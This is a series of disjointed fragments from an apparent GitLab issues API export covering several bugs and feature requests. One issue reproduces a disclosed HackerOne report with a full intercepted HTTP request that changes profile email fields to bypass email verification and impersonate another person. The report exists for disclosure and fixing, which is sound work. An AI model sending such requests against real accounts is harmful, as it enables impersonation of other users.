Some times I've run manually the migration and again, new snippets without repositories appear.\n\nThe thing is that looking at Kibana, we don't see the same patterns that we might have when the user creates snippets through the snippet create/update services.\n\nIn fact, an interesting thing is that those non-migrated snippets ids are quite high meaning that are new snippets. So how are those snippets created and why the repository is not created?\n\nToday I discovered that all non-migrated snippets are project ones. Besides, I've seen that some of them have correlative ids, meaning that they were created one after another. Another interesting fact is that those non-migrated snippets had old `created_at` dates not up to dates ones like they should.\n\nAll these facts led me to think that this problem was related to project imports. Once I checked some of these snippets' projects, I could see that these were imported projects and they all had import errors.\n\nTherefore, this is the main problem. When we import snippets, we import the db records first and after we call the `SnippetRepoLoader` to restore the snippet contents. The problem is that if there is an error in any of the other `loaders`, snippets won't have a repository and this is a state we don't want and shouldn't be present. It's better to delete the snippet rather than having it in the database without a repository.\n\nNow, it sounds hard because we have all the information we need to create the snippet repository. Nevertheless, one we add the ability to add multiple files per snippets, that info won't be stored in the database, so we don't need to create even the record in the database and just fail the process.\n\n### Proposal\nI think we have to act in two places:\n\n#### When the `SnippetsRepoRestorer` is called but one of the snippet repositories couldn't be created.\n\nIn https://gitlab.com/gitlab-org/gitlab/blob/master/lib/gitlab/import_export/snippets_repo_restorer.rb#L15 we call the `SnippetRepoRestorer` per each snippet. Whenever one of those calls returns `false`, the process stops and we won't try to backfill the rest of snippets. This means that we will end up with non migrated snippets.\n\nWe can tweak this a little bit and call the `SnippetRepoRestorer` service on every snippet, no matter the result of previous snippets. Then, if any of the snippets failed to create the repository we will just fail the operation and **delete** those snippets that couldn't be migrated. This will prevent us from having non-migrated snippets in the database. \n\n#### When the `SnippetsRepoRestorer` is not even called\nIn https://gitlab.com/gitlab-org/gitlab/blob/master/lib/gitlab/import_export/importer.rb#L21, we call all the object restorers one by one but, what happens if any of them raises an unexpected exception. Well, if the restorer is before in line that the `SnippetsRepoRestorer` that means that no snippet will be migrated and we will have non migrated snippet in the database. My proposal here is to call the `SnippetRepoRestorer` when the exception is raised. It will take care of removing those snippet that couldn't be migrated.\n\n","state":"closed","created_at":"2020-06-01T14:38:40.032Z","updated_at":"2020-06-08T09:04:15.211Z","closed_at":"2020-06-08T07:05:49.141Z","closed_by":{"id":955795,"username":"fjsanpedro","name":"Francisco

Gitlab public and commit email addresses changing validation","description":"**[HackerOne report #881798](https://hackerone.com/reports/881798)** by `enumzero` on 2020-05-24, assigned to @vdesousa:\n\n### Summary\n\nGitlab doesn't check the reliability of the `user[public_email]` and the `user[commit_email]` parameters. In the backend, it just checks if those fields are matched with the `user[email]` but doesn't check if the email address has been verified. So by changing the `user[email]`, `user[public_email]` and `user[commit_email]` at the same time, maybe a result of like-race condition, the server will change the user public email and commit email to become the same email as the currently-changed email address in the request (which hasn't been verified yet). \n\n\n### Steps to reproduce\n\n1. Visit the editing profile page.  \n2. Change a little bit your personal information and then save it  \n3. Intercept the request and change `user[email]`,  `user[public_email]`, `user[commit_email]` to an email address that you don't own:\n\n```http  \nPOST /profile HTTP/1.1  \nHost: gitlab.com  \nConnection: close  \nContent-Length: 2241  \nX-CSRF-Token: +utNjLghrMk40Dq/enME6hhrGtQUQNjJhCn52Nx/9MZpGeKThp3RGyGlY3fE+PxWm/nL2dHfxhP6SRXwFdE8gg==  \nContent-Type: multipart/form-data; boundary=----WebKitFormBoundaryaOzwbFxhP1w6FI7U\n\n------WebKitFormBoundaryaOzwbFxhP1w6FI7U  \nContent-Disposition: form-data; name=\"authenticity_token\"\n\n+utNjLghrMk40Dq/enME6hhrGtQUQNjJhCn52Nx/9MZpGeKThp3RGyGlY3fE+PxWm/nL2dHfxhP6SRXwFdE8gg==  \n------WebKitFormBoundaryaOzwbFxhP1w6FI7U  \nContent-Disposition: form-data; name=\"user[status][emoji]\"\n\n\n------WebKitFormBoundaryaOzwbFxhP1w6FI7U  \nContent-Disposition: form-data; name=\"user[status][message]\"\n\n\n------WebKitFormBoundaryaOzwbFxhP1w6FI7U  \nContent-Disposition: form-data; name=\"user[name]\"\n\nusername  \n------WebKitFormBoundaryaOzwbFxhP1w6FI7U  \nContent-Disposition: form-data; name=\"user[id]\"\n\n5645507  \n------WebKitFormBoundaryaOzwbFxhP1w6FI7U  \nContent-Disposition: form-data; name=\"user[email]\"\n\nngalog@gitlab.com  \n------WebKitFormBoundaryaOzwbFxhP1w6FI7U  \nContent-Disposition: form-data; name=\"user[public_email]\"\n\nngalog@gitlab.com  \n------WebKitFormBoundaryaOzwbFxhP1w6FI7U  \nContent-Disposition: form-data; name=\"user[commit_email]\"\n\nngalog@gitlab.com  \n```  \n4. Now your commit email address and your public email address have been changed to that email. \n\n\n### Examples\n\nCheck out my profile:`[@]justforhack`\n\n\n### What is the current *bug* behavior?\n\nThe public and commit email addresses have a bad confirmation in the backend. It just checks if the email addresses are the same as the current email address. And when you send a request which also changes your current email address, the server will change your current email address first then perform change the `user[commit_email]` and `user[public_email]` after, which the user was able to bypass the check\n\n### What is the expected *correct* behavior?\n\nCommit and public email should be checked with verified email addresses, not only email addresses\n\n## Impact\n\nImpersonate as company employee with the public email address. Perform Gitlab git-related actions with the \"verified\" arbitrary email address and bypass the committing restriction","state":"closed","created_at":"2020-06-01T13:21:24.248Z","updated_at":"2022-07-07T12:50:52.709Z","closed_at":"2021-09-01T10:09:57.011Z","closed_by":{"id":5054702,"username":"vdesousa","name":"Vitor Meireles De Sousa","state":"active","avatar_url":"https://secure.gravatar.com/avatar/f44d19f10d5b0c54a02e79c13812ff77?s=80\u0026d=identicon","web_url":"https://gitlab.com/vdesousa"},"labels":["Category:Authentication and Authorization","Category:User Management","Epic 6340","FY22::Q3","HackerOne","Weakness::CWE-502","backend","devops::manage","group::authentication and authorization","missed-deliverable","missed:14.2","priority::4","section::dev","security","security-backlog::needs-input","severity::4","workflow::production"],"milestone":{"id":1948702,"iid":63,"group_id":9970,"title":"14.3","description":"https://about.gitlab.com/releases/archives.html","state":"closed","created_at":"2021-03-17T21:43:36.613Z","updated_at":"2022-04-21T07:25:29.231Z","due_date":"2021-09-17","start_date":"2021-08-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/63"},"assignees":[{"id":4826728,"username":"m_frankiewicz","name":"Magdalena Frankiewicz","state":"active","avatar_url":"https://secure.gravatar.com/avatar/ca314fa77051f58ced6e3e5bf7f0dd48?s=80\u0026d=identicon","web_url":"https://gitlab.com/m_frankiewicz"}],"author":{"id":2741139,"username":"gitlab-securitybot","name":"GitLab SecurityBot","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/2741139/avatar.png","web_url":"https://gitlab.com/gitlab-securitybot"},"type":"ISSUE","assignee":{"id":4826728,"username":"m_frankiewicz","name":"Magdalena Frankiewicz","state":"active","avatar_url":"https://secure.gravatar.com/avatar/ca314fa77051f58ced6e3e5bf7f0dd48?s=80\u0026d=identicon","web_url":"https://gitlab.com/m_frankiewicz"},"user_notes_count":28,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/219745","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":2,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/219745","notes":"https://gitlab.com/api/v4/projects/278964/issues/219745/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/219745/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#219745","relative":"#219745","full":"gitlab-org/gitlab#219745"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":null},{"id":35267151,"iid":219744,"project_id":278964,"title":"Fix bug when importing snippets and creating repository content","description":"Implementing the [snippet migration](https://gitlab.com/gitlab-org/gitlab/-/issues/208904) we discovered several edges cases that we had to fix in order to run a successful migration.

that allows an attacker to read private data such as private repositories. It happens because of the Gitlab CL runner, which allows any user who has CI_JOB_TOKEN can git into public (or internal) projects (all data) although the data have been set as **Only Projects Members**.

Group`.\n\n![image](/uploads/f4c49d815d8d520abdd97a761165bf32/image.png)","state":"closed","created_at":"2020-05-29T23:42:08.501Z","updated_at":"2022-05-30T17:37:17.627Z","closed_at":"2020-07-28T18:52:59.878Z","closed_by":{"id":5708766,"username":"terrichu","name":"Terri

Problem to solve\n\nHistorically, we have set hard limits for diff size in order to ensure performance and a good UX, however, an increasing number of users come across large diff which go beyond these limits and provide a poor experience.\n\n### Intended users\n\n* [Delaney (Development Team Lead)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#delaney-development-team-lead)\n* [Sasha (Software Developer)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#sasha-software-developer)\n\n### User experience goal\n\nUsers should have a seamless experience no matter the size of their diff.\n\n### Proposal\n\nThanks to the great work done in https://gitlab.com/groups/gitlab-org/-/epics/1816, diff load performance has increased significantly and thus increasing limits should not be as costly now.\n\n1. Increase limit for the number of files loaded on a single diff (currently 1000 - the total number of files allowed to be loaded, ie the hard limit)\n1. Increase total number of rendered files for a single diff (currently 50k - the number of files expanded by default, ie the soft limit)\n1. Increase limit for the number fo lines loaded on diff (currently 5k - total number of lines allowed to be loaded, ie the hard limit)\n1. Increase total number of rendered lines on diff (currently 50k - number of lines expanded by default, ie the soft limit)\n\nSource for limit documentation: https://docs.gitlab.com/ee/development/diffs.html#diff-collection-limits\n\n### Permissions and Security\n\n\u003c!-- What permissions are required to perform the described actions? Are they consistent with the existing permissions as documented for users, groups, and projects as appropriate? Is the proposed behavior consistent between the UI, API, and other access methods (e.g. email replies)?--\u003e\n\n### Documentation\n\n\u003c!-- See the Feature Change Documentation Workflow https://docs.gitlab.com/ee/development/documentation/workflow.html#for-a-product-change\n\n* Add all known Documentation Requirements in this section. See https://docs.gitlab.com/ee/development/documentation/feature-change-workflow.html#documentation-requirements\n* If this feature requires changing permissions, update the permissions document. See https://docs.gitlab.com/ee/user/permissions.html --\u003e\n\n### Availability \u0026 Testing\n\n\u003c!-- This section needs to be retained and filled in during the workflow planning breakdown phase of this feature proposal, if not earlier.\n\nWhat risks does this change pose to our availability? How might it affect the quality of the product? What additional test coverage or changes to tests will be needed? Will it require cross-browser testing?\n\nPlease list the test areas (unit, integration and end-to-end) that needs to be added or updated to ensure that this feature will work as intended. Please use the list below as guidance.\n* Unit test changes\n* Integration test changes\n* End-to-end test change\n\nSee the test engineering planning process and reach out to your counterpart Software Engineer in Test for assistance: https://about.gitlab.com/handbook/engineering/quality/test-engineering/#test-planning --\u003e\n\n### What does success look like, and how can we measure that?\n\n\u003c!-- Define both the success metrics and acceptance criteria. Note that success metrics indicate the desired business outcomes, while acceptance criteria indicate when the solution is working correctly. If there is no way to measure success, link to an issue that will implement a way to measure this. --\u003e\n\n### What is the type of buyer?\n\n\u003c!-- What¬†is¬†the¬†buyer¬†persona¬†for¬†this¬†feature?¬†See¬†https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/buyer-persona/\nIn which enterprise tier should this feature go? See https://about.gitlab.com/handbook/product/pricing/#four-tiers --\u003e\n\n### Is this a cross-stage feature?\n\n\u003c!-- Communicate if this change will affect multiple Stage Groups or product areas. We recommend always start with the assumption that a feature request will have an impact into another Group. Loop in the most relevant PM and Product Designer from that Group to provide strategic support to help align the Group's broader plan and vision, as well as to avoid UX and technical debt. https://about.gitlab.com/handbook/product/#cross-stage-features --\u003e\n\n### Links / references\n\n- https://gitlab.zendesk.com/agent/tickets/57833\n- https://gitlab.zendesk.com/agent/tickets/80684\n- https://gitlab.zendesk.com/agent/tickets/83179\n- https://gitlab.zendesk.com/agent/tickets/85596\n- https://gitlab.zendesk.com/agent/tickets/85969\n- https://gitlab.zendesk.com/agent/tickets/89525\n- https://gitlab.zendesk.com/agent/tickets/92459\n- https://gitlab.zendesk.com/agent/tickets/118162\n- https://gitlab.my.salesforce.com/00161000013aRjG\n- https://gitlab.zendesk.com/agent/tickets/120299\n- https://gitlab.my.salesforce.com/00161000004bZPD?srPos=0\u0026srKp=001\n- https://gitlab.zendesk.com/agent/tickets/137400\n- https://gitlab.zendesk.com/agent/tickets/147208","state":"closed","created_at":"2020-05-29T20:40:45.207Z","updated_at":"2022-07-11T18:57:42.673Z","closed_at":"2020-11-03T16:49:24.819Z","closed_by":{"id":1931266,"username":"danielgruesso","name":"Daniel Gruesso","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/1931266/avatar.png","web_url":"https://gitlab.com/danielgruesso"},"labels":["Category:Source Code Management","Deliverable","backend","backend-weight::2","customer","customer+","devops::create","diff","frontend","frontend-weight::2","group::source code","missed-deliverable","missed:13.4","section::dev","type::feature","workflow::verification"],"milestone":{"id":1233754,"iid":52,"group_id":9970,"title":"13.5","description":"https://about.gitlab.com/releases/2020/10/22/gitlab-13-5-released/","state":"closed","created_at":"2020-04-09T17:39:21.990Z","updated_at":"2022-04-21T07:21:12.213Z","due_date":"2020-10-17","start_date":"2020-09-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/52"},"assignees":[{"id":4017300,"username":"jboyson","name":"Justin Boyson","state":"blocked","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/4017300/avatar.png","web_url":"https://gitlab.com/jboyson"},{"id":5918904,"username":"marc_shaw","name":"Marc Shaw","state":"active","avatar_url":"https://secure.gravatar.com/avatar/78c946cb19e40815a2b5d97cefecec6a?s=80\u0026d=identicon","web_url":"https://gitlab.com/marc_shaw"}],"author":{"id":1931266,"username":"danielgruesso","name":"Daniel Gruesso","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/1931266/avatar.png","web_url":"https://gitlab.com/danielgruesso"},"type":"ISSUE","assignee":{"id":4017300,"username":"jboyson","name":"Justin Boyson","state":"blocked","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/4017300/avatar.png","web_url":"https://gitlab.com/jboyson"},"user_notes_count":24,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/219565","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":2,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/219565","notes":"https://gitlab.com/api/v4/projects/278964/issues/219565/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/219565/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#219565","relative":"#219565","full":"gitlab-org/gitlab#219565"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":2481,"epic":{"id":18186,"iid":2481,"title":"Soften application limits for diffs","url":"/groups/gitlab-org/-/epics/2481","group_id":9970,"human_readable_end_date":"Nov 17, 2020","human_readable_timestamp":"\u003cstrong\u003ePast due\u003c/strong\u003e"},"iteration":null,"health_status":null},{"id":35197852,"iid":219551,"project_id":278964,"title":"Project access tokens not working to authenticate against Git over HTTP","description":"\u003c!---\nPlease read this!\n\nBefore opening a new issue, make sure to search for keywords in the issues\nfiltered by the \"regression\" or \"bug\" label:\n\n- https://gitlab.com/gitlab-org/gitlab/issues?label_name%5B%5D=regression\n- https://gitlab.com/gitlab-org/gitlab/issues?label_name%5B%5D=bug\n\nand verify the issue you're about to submit isn't a duplicate.\n---\u003e\n\n### Summary\n\nOriginally reported here: https://gitlab.com/groups/gitlab-org/-/epics/2587#note_351230899\n\nAuthenticating against Git over HTTP does not work with Project Access Tokens.

Output of checks\r\n\r\nThis bug happens on GitLab.com\r\n\r\n### Possible fixes\r\n\r\nThe `license_scanning` job was working before, but in a (recent commit)[https://gitlab.com/gitlab-org/security-products/license-management/-/blob/0b976fcffe0a9b8e80587adb076bcdf279c9331c/config/.tool-versions] the golang version was bumped to 1.14.\r\nThis version of golang implicitly adds the `-mod=vendor` flag to all [golang commands](https://golang.org/doc/go1.14#go-command).\r\nHowever, there is a known issue that `go list all` does not work with vendoring:\r\n\r\nhttps://github.com/golang/go/issues/35589#issuecomment-554488544\r\nhttps://github.com/golang/go/issues/33848#issuecomment-537222782\r\n\r\n\u003e **Dependency analysis**\r\n\u003e Because the approach proposed here does not retain go.mod files for modules that do not contribute packages to the build (including older-than-selected versions of \u003e \u003e \u003e packages that do contribute packages), the vendor directory will not support analysis of the module graph (go list -m all, go mod why -m, and go mod graph).\r\n\r\nMy proposal to fix this issue is to disable using the vendor directory to determine dependencies.\r\nI have submitted a MR as a possible fix for this bug.\r\n\r\n~bug ~\"devops::secure\" ~\"Category:License

create API does not honour access levels across multiple features","description":"### Summary\n\nCalling the create project API with `wiki_access_level=disabled` does not disable the wiki. This issue is present when setting access levels across other features as well, as described in the related issues. The fix for this should be comprehensive of all properties. \n\n### Root cause and other fields affected by this bug\n\nThis same bug also exists for the other deprecated \"shadowed\" fields: `builds_enabled`, `merge_requests_enabled`, `issues_enabled`, and `snippets_enabled`.\n\nThe root cause has been identified. Here's a summary of what's going on...\n\n### Recap of how to reproduce bug:\n\nWhen you specify `wiki_access_level=disabled` in a project create API call, it has no effect, and ends up getting set to `enabled`.\n\n### Recap of relevant code\n\n1. The `wiki_access_level=disabled` field is set via `ProjectFeaturesCompatibility#wiki_access_level=`. `wiki_access_level` lives on `ProjectFeature`, and is a delegated property from `Project`.\n1. The deprecated `wiki_enabled` boolean property \"shadows\" this field, so if it is true, `wiki_access_level` gets set to `enabled`, via `ProjectFeaturesCompatibility#wiki_enabled=`.\n1. Both of these fields have a `default_value_for` specified in their models.\n1. The [default value for ](https://gitlab.com/gitlab-org/gitlab/blob/c95102ffad40e43ceae1183bd6f4daaa83d53e10/app/models/project.rb#L85-85)`wiki_enabled` is `true` (based on the [default config from ](https://gitlab.com/gitlab-org/gitlab/blob/c95102ffad40e43ceae1183bd6f4daaa83d53e10/config/gitlab.yml.example#L142-142)`gitlab.yml`)\n\n### Cause of bug\n\nThe bug occurs because the `default_value_for` for `wiki_enabled` calls `ProjectFeaturesCompatibility#wiki_enabled=` **AFTER** the specified `wiki_access_level` is set based on the passed `wiki_access_level=disabled` API parameter, thus overwriting the specified `disabled` value and resetting it to `enabled`.\n\n### Other fields affected by this bug\n\nThis same bug also exists for the other deprecated \"shadowed\" fields: `builds_enabled`, `merge_requests_enabled`, `issues_enabled`, and `snippets_enabled`\n\n### How should we fix it?\n\nThe simplest approach seems to be to just delete all the `default_value_for` declarations for the deprecated fields\n\nThis should be fine, because there's still `default_value_for` entries [for all the corresponding non-deprecated fields](https://gitlab.com/gitlab-org/gitlab/blob/c95102ffad40e43ceae1183bd6f4daaa83d53e10/app/models/project_feature.rb#L40-46).\n\nHowever, it does seem to break several tests in `project_spec.rb`, so we'll have to look into whether those are real problems or just tests which need to be rewritten to account for the change.\n\nThere is an MR to work on this fix: https://gitlab.com/gitlab-org/gitlab/-/merge_requests/53204. However, it is not yet (as of 2021-02-05) clear what is the appropriate fix is - see [this MR thread](https://gitlab.com/gitlab-org/gitlab/-/merge_requests/53204#note_502483768) for a discussion of possible fixes and the associated risks and complexity.\n\n### Steps to reproduce\n\nUsing `httpie(1)` run the following:\n\n```\nhttp -v POST https://gitlab.com/api/v4/projects Private-Token:XXXXXXXXXXX name=test-wiki-access-level wiki_access_level=disabled\n\n```\n\nOr using `curl`:\n\n```\ncurl --request POST --header \"PRIVATE-TOKEN: XXXXXXXX\" \"http://localhost:3000/api/v4/projects?name=test-wiki-access-level\u0026wiki_access_level=disabled\"\n```\n\n### Example Project\n\nhttps://gitlab.com/bradwood/test-wiki-access-level  (defaults to _private_ project, but wiki access is still enabled)\n\n\n### What is the current *bug* behavior?\n\nThe project is created with the `wiki_access_level` unchanged from the default of being enabled.\n\n![wiki_access_gitlab](/uploads/2184e1642c11954da658633a1299bc5e/wiki_access_gitlab.png)\n\nAPI response confirms this (both request and response shown below)\n\n```http\n\nPOST

However, when I try this I get a YAML lint error. \n\nMy use case is that I am using the extends keyword to apply some custom rules to multiple jobs. However, only the deployment job should be manual (see sample .gitlab-ci.yml file below). I can get around this by making `.custom-rule-manual` and explicitly setting `when: manual` but then the if statement is duplicated, which I'd like to avoid.\n\n### Steps to reproduce\n\nThe following .gitlab-ci.yml file fails linting with the error ```jobs:deployjob config key may not be used with `rules`: when```. I am using the GitLab.com CI Lint.\n\n```yml\ntestJob:\n  stage: test\n  script:\n    - echo Testing\n  rules:\n    - if: '$CI_MERGE_REQUEST_TARGET_BRANCH_NAME == $STAGE_BRANCH'\n    \ndeployJob:\n  stage: deploy\n  when: manual\n  script:\n    - echo Deploying\n  rules:\n    - if: '$CI_MERGE_REQUEST_TARGET_BRANCH_NAME == $STAGE_BRANCH'\n```\n\n### Proposal\n- The expected behavior is that we should add support for jobs:when and rules to support the above configuration\n- There was a discussion regarding the implicit and the explicit `when` (should one override the other?), however, eventually we agreed that implicit `when` should not override explicit `when` [here](https://gitlab.com/gitlab-org/gitlab/-/issues/219437#note_705633787) and [here](https://gitlab.com/gitlab-org/gitlab/-/issues/219437#note_684583668).\n- Here is a short [POC proposal](https://gitlab.com/gitlab-org/gitlab/-/issues/219437#note_706016913)\n- The change will not contain [Breaking changes](https://gitlab.com/gitlab-org/gitlab/-/issues/219437#note_706303751)","state":"closed","created_at":"2020-05-28T21:26:32.173Z","updated_at":"2022-09-26T15:54:50.752Z","closed_at":"2021-12-15T10:25:40.835Z","closed_by":{"id":3946912,"username":"lauraX","name":"Laura Montemayor","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3946912/avatar.png","web_url":"https://gitlab.com/lauraX"},"labels":["CI rules","Category:Pipeline Authoring","Verify candidate","backend","candidate::14.6","customer","devops::verify","feature::enhancement","group::pipeline authoring","internal customer","missed:14.2","quad-planning::ready","release post item::in review","section::ops","type::feature","workflow::canary"],"milestone":{"id":2114820,"iid":67,"group_id":9970,"title":"14.6","description":"https://about.gitlab.com/releases/archives.html","state":"closed","created_at":"2021-06-23T05:00:52.094Z","updated_at":"2022-04-21T07:26:38.271Z","due_date":"2021-12-17","start_date":"2021-11-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/67"},"assignees":[{"id":3946912,"username":"lauraX","name":"Laura Montemayor","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3946912/avatar.png","web_url":"https://gitlab.com/lauraX"}],"author":{"id":2669408,"username":"arthurorbica","name":"Arthur McGregor","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/2669408/avatar.png","web_url":"https://gitlab.com/arthurorbica"},"type":"ISSUE","assignee":{"id":3946912,"username":"lauraX","name":"Laura Montemayor","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3946912/avatar.png","web_url":"https://gitlab.com/lauraX"},"user_notes_count":106,"merge_requests_count":0,"upvotes":34,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/219437","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":2,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/219437","notes":"https://gitlab.com/api/v4/projects/278964/issues/219437/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/219437/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#219437","relative":"#219437","full":"gitlab-org/gitlab#219437"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":{"id":36609,"iid":38,"sequence":5,"group_id":9970,"title":"Pipeline Authoring: December 13, 2021 - December 26, 2021","description":"Target milestone `14.7`","state":3,"created_at":"2021-10-05T20:42:58.383Z","updated_at":"2021-12-27T00:05:02.133Z","start_date":"2021-12-13","due_date":"2021-12-26","web_url":"https://gitlab.com/groups/gitlab-org/-/iterations/36609"},"health_status":"on_track"},{"id":35139484,"iid":219431,"project_id":278964,"title":"CI linter: Render warning messages in UI (MVC)","description":"\u003c!--¬†The¬†first¬†four¬†sections:¬†\"Problem¬†to¬†solve\",¬†\"Intended¬†users\", \"User experience goal\",¬†and¬†\"Proposal\",¬†are¬†strongly¬†recommended,¬†while¬†the¬†rest¬†of¬†the¬†sections¬†can¬†be¬†filled¬†out¬†during the problem validation or breakdown phase.

We should document the individual endpoints.\n\n### Further details / Reasoning\n\nPackage manager clients interact with the GitLab package registry by making API requests. So, for example, when you run `npm install`, a GET request is made to a route defined in the [`npm_packages.rb` API file](https://gitlab.com/gitlab-org/gitlab/-/blob/9d648aee01354785c783d930089e90f0b1ef4160/ee/lib/api/npm_packages.rb#L110). While it is expected that most users will interact with these endpoints using the package manager clients, they are all public, so there is no reason to hide them from the documentation if a user could manually make requests to each of them anyways. This could benefit some users that want to manually call some of these endpoints in custom scripts. It also benefits developers working on GitLab in that the endpoints are better documented and less time needs to be spent understanding what each route does and why.\n\n### Who can address the issue\n\nA ~\"group::package\" engineer will likely be the best individual to create the initial docs.\n\n### List of Docs to be created\n\n- [x] Conan\n- [x] NPM\n- [x] Maven\n- [x] NuGet\n- [x] Composer\n- [x] PyPI\n- [x] GoProxy\n- [-] Generic (N/A because the generic package registry is already documented as an API)\n- [-] Debian (still in development)\n- [x] RubyGems\n\n### Other links/references\n\n\u003c!-- E.g. related GitLab issues/MRs --\u003e","state":"closed","created_at":"2020-05-28T17:53:16.561Z","updated_at":"2021-09-21T10:55:39.850Z","closed_at":"2021-05-18T23:02:19.729Z","closed_by":{"id":4059254,"username":"sabrams","name":"Steve Abrams","state":"active","avatar_url":"https://secure.gravatar.com/avatar/cac831f7b515c191dfba32c54f01c375?s=80\u0026d=identicon","web_url":"https://gitlab.com/sabrams"},"labels":["Category:Package Registry","devops::package","documentation","good for new contributors","group::package registry","missed:13.11","section::ops","workflow::production"],"milestone":{"id":1850113,"iid":60,"group_id":9970,"title":"14.0","description":"","state":"closed","created_at":"2021-01-26T16:55:07.714Z","updated_at":"2022-04-21T07:25:17.749Z","due_date":"2021-06-17","start_date":"2021-05-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/60"},"assignees":[{"id":4059254,"username":"sabrams","name":"Steve Abrams","state":"active","avatar_url":"https://secure.gravatar.com/avatar/cac831f7b515c191dfba32c54f01c375?s=80\u0026d=identicon","web_url":"https://gitlab.com/sabrams"}],"author":{"id":4059254,"username":"sabrams","name":"Steve Abrams","state":"active","avatar_url":"https://secure.gravatar.com/avatar/cac831f7b515c191dfba32c54f01c375?s=80\u0026d=identicon","web_url":"https://gitlab.com/sabrams"},"type":"ISSUE","assignee":{"id":4059254,"username":"sabrams","name":"Steve Abrams","state":"active","avatar_url":"https://secure.gravatar.com/avatar/cac831f7b515c191dfba32c54f01c375?s=80\u0026d=identicon","web_url":"https://gitlab.com/sabrams"},"user_notes_count":10,"merge_requests_count":0,"upvotes":1,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/219419","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":8,"completed_count":8},"weight":2,"blocking_issues_count":0,"has_tasks":true,"task_status":"8 of 8 checklist items completed","_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/219419","notes":"https://gitlab.com/api/v4/projects/278964/issues/219419/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/219419/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#219419","relative":"#219419","full":"gitlab-org/gitlab#219419"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":4524,"epic":{"id":119852,"iid":4524,"title":"Expand the Packages data model and api","url":"/groups/gitlab-org/-/epics/4524","group_id":9970,"human_readable_end_date":"Jun 17, 2021","human_readable_timestamp":"\u003cstrong\u003ePast due\u003c/strong\u003e"},"iteration":null,"health_status":null},{"id":35135919,"iid":219418,"project_id":278964,"title":"Follow-up from \"WIP: Send less data to Vulnerabilites page\"","description":"The following discussion from !31616 should be addressed:\n\n- [ ] @ekigbo started a [discussion](https://gitlab.com/gitlab-org/gitlab/-/merge_requests/31616#note_351151896):  (+1 comment)\n\n    \u003e Any reason for the mix of snake_case and camelCase across this file?

Ex: `packageFileRegistries`\n```\nquery($before: String!, $after: String!) {\n  geoNode {\n    packageFileRegistries(first: 20, before: $before, after: $after) {\n      edges {\n        ...\n      }\n    }\n  }\n}\n```\n\nHowever, with the need to be Generic for the ~frontend, we need a way to pass a variable to the query based on which registry we want.\n\n**Example of what I believe is NOT possible:**\n```\nquery($registry: String!, $before: String!, $after: String!) {\n  geoNode {\n    $registry(first: 20, before: $before, after: $after) {\n      edges {\n        ...\n      }\n    }\n  }\n}\n```\n\n## Proposal\n\nRefactor the Geo GraphQL endpoint a bit to support a parameterized lookup of registries, for example:\n\n```\nquery($registry: String!, $before: String!, $after: String!) {\n  geoNode {\n    geoRegistry(registry: $registry, first: 20, before: $before, after: $after) {\n      edges {\n        ...\n      }\n    }\n  }\n}\n```\n\nThis will allow us to continue to key off a single registry key for [routes](https://gitlab.com/gitlab-org/gitlab/-/issues/216969), [views](https://gitlab.com/gitlab-org/gitlab/-/issues/219315), and **GraphQL**\n\ncc:

